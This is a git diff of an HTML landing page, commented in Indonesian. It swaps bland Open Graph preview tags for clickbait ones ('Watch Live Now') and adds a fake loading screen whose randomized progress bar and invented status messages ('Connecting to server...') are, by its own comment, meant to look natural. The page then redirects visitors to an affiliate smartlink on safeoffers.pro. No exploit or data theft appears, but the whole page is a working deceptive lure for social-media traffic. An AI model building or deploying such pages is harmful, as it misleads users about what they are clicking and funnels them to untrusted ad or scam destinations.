@@ -1,43 +1,120 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <title>Loading...</title>
 
-  <!-- ================= OG PREVIEW ================= -->
-
-  <!-- Gambar preview (random tapi valid & stabil) -->
-  <meta property="og:image" content="https://image-assets-mu.vercel.app/preview1.jpg">
-
-  <!-- Judul -->
-  <meta property="og:title" content="Simple Access">
-
-  <!-- Deskripsi -->
-  <meta property="og:description" content="Tap to continue...">
-
-  <!-- URL (isi domain kamu nanti kalau sudah ada) -->
-  <meta property="og:url" content="https://example.com">
-
-  <!-- Tipe -->
-  <meta property="og:type" content="website">
-
-  <!-- Ukuran biar FB cepat detect -->
+  <!-- ========== OG PREVIEW ========== -->
+  <meta property="og:title" content="🔥 Watch Live Now">
+  <meta property="og:description" content="Click to watch before it's gone!">
+  <meta property="og:image" content="https://i.imgur.com/tSouY4T.jpeg">
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://web-load.vercel.app/">
 
-  <!-- Tambahan biar aman -->
-  <meta name="twitter:card" content="summary_large_image">
+  <style>
+    body {
+      margin: 0;
+      background: #0f0f0f;
+      color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+    }
+
+    .loader {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #333;
+      border-top: 5px solid #00ffcc;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 25px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    h2 {
+      margin: 0;
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+
+    .progress-bar {
+      width: 220px;
+      height: 6px;
+      background: #222;
+      border-radius: 10px;
+      overflow: hidden;
+      margin-top: 10px;
+    }
+
+    .progress {
+      height: 100%;
+      width: 0%;
+      background: #00ffcc;
+      transition: width 0.3s ease;
+    }
+
+    p {
+      font-size: 13px;
+      opacity: 0.6;
+      margin-top: 8px;
+    }
+  </style>
 
 </head>
 
 <body>
 
-<script>
-  // Delay biar Facebook sempat scrape OG
-  setTimeout(function() {
-    window.location.href = "https://example.com"; // ganti ke smartlink kamu nanti
-  }, 2000);
-</script>
+  <div class="loader"></div>
+
+  <h2 id="status">Preparing your content...</h2>
+
+  <div class="progress-bar">
+    <div class="progress" id="progress"></div>
+  </div>
+
+  <p>Please wait a moment</p>
+
+  <script>
+    let progress = 0;
+    let progressBar = document.getElementById("progress");
+    let statusText = document.getElementById("status");
+
+    let interval = setInterval(() => {
+      progress += Math.random() * 15; // biar keliatan natural
+      if (progress > 100) progress = 100;
+
+      progressBar.style.width = progress + "%";
+
+      // ubah teks biar lebih realistis
+      if (progress < 30) {
+        statusText.innerText = "Preparing your content...";
+      } else if (progress < 60) {
+        statusText.innerText = "Connecting to server...";
+      } else if (progress < 90) {
+        statusText.innerText = "Almost ready...";
+      } else {
+        statusText.innerText = "Launching...";
+      }
+
+      if (progress >= 100) {
+        clearInterval(interval);
+
+        // redirect ke smartlink
+        window.location.href = "https://safeoffers.pro/a/BBA5ZFnOKcj3Mz";
+      }
+
+    }, 300); // smooth speed
+  </script>
 
 </body>
 </html>
